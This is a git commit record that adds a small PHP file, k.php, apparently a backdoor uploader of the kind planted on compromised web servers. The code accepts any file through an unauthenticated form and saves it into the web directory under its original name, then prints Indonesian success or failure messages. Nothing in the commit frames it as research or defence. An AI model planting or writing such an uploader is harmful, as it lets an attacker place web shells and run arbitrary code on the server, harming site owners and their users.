be96444af7af0fd1a4a388307072013fa3acace6
Speciment <33392944+SpecimentID@users.noreply.github.com>
2019-12-21 01:57:31 +0700

    Add files via upload

---
+++ k.php
@@ -0,0 +1,16 @@
+<?php 
+if($_POST){
+if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
+echo"<b>berhasil</b>-->".$_FILES["f"]["name"];
+}else{
+echo"<b>gagal";
+}
+}
+else{
+	echo "Speciment
+	<br><form method=post enctype=multipart/form-data>
+	<input type=file name=f>
+	<input name=v type=submit id=v value=up><br>";
+}
+
+?>
